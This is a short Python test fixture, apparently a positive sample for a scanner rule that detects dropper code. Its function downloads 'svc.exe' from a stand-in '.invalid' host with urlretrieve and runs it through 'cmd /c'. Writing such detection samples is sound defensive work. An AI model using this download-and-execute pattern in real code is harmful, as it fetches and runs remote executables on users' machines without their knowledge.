"""PHX-DRP-002 positive (ADR-031): `urlretrieve` saves the download to a path, and the path
is started through the shell. No handle, no write call: the save is inside the library.
Inert: the host is under `.invalid`.
"""
import os
import subprocess
import tempfile
from urllib.request import urlretrieve


def install_service():
    p = os.path.join(tempfile.gettempdir(), "svc.exe")
    urlretrieve("https://cdn.example.invalid/svc.exe", p)
    subprocess.run(["cmd", "/c", p], check=False)
